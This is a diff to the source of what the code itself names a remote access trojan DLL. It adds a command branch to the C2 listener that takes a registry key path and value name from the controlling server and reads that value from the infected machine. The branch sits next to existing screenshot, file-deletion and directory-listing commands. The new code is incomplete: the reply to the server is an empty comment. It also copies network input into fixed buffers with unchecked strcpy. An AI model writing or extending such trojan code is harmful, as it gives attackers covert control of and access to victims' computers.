@@ -8,6 +8,7 @@
 #include "RAT-Dll-DirList.h"
 #include "RAT-Dll-DeleteFile.h"
 #include "RAT-Dll-Screenshot.h"
+#include "RAT-Dll-Registry.h"
 
 
 /** This function will serve as our main 'handler' for C2 requests
@@ -366,6 +367,60 @@ INT startListen()
                 }
 
                 OutputDebugStringA("RAT-Dll-Connect::startListen - Successfully performed screenshot!\n");
+            }
+
+            // C2 says to read a registry key 
+            else if (strcmp((const char*)&recvBuf, REGREAD) == 0)
+            {
+                // Receive our key path 
+                status = recv(clientSock, recvBuf, recvBufLen, 0);
+                if (status == SOCKET_ERROR)
+                {
+                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failed to recv (key path) %d\n", WSAGetLastError());
+                    OutputDebugStringA(msgBuf);
+                    continue; // keep trying to do things until we disconnect or receive a cleanup message
+                }
+
+                // Assign key path to separate buffer 
+                CHAR keyPathBuffer[DEFAULT_BUF_LEN];
+                strcpy(keyPathBuffer, recvBuf);
+
+                // Get the value name
+                status = recv(clientSock, recvBuf, recvBufLen, 0);
+                if (status == SOCKET_ERROR)
+                {
+                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failed to recv (value name) %d\n", WSAGetLastError());
+                    OutputDebugStringA(msgBuf);
+                    continue;
+                }
+
+                CHAR valueBuffer[DEFAULT_BUF_LEN];
+                strcpy(valueBuffer, recvBuf);
+
+                sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Performing reg read on path %s with key %s...\n", keyPathBuffer, valueBuffer);
+                OutputDebugStringA(msgBuf);
+
+                void* regValue = NULL;
+                /**regValue = (void**)malloc(sizeof(void*));
+                if (regValue == NULL)
+                {
+                    OutputDebugStringA("RAT-Dll::startListen - Failed to allocate space for regValue buffer! \n");
+                    status = FAILURE;
+                    goto cleanup;
+                }*/
+
+                DWORD sizeRegValue = 0;
+
+                status = performRegRead(keyPathBuffer, valueBuffer, &regValue, &sizeRegValue);
+                if (status != SUCCESS)
+                {
+                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from performRegRead %d\n", status);
+                    OutputDebugStringA(msgBuf);
+                    goto cleanup;
+                }
+
+                // send back success
+
             }
         }
 
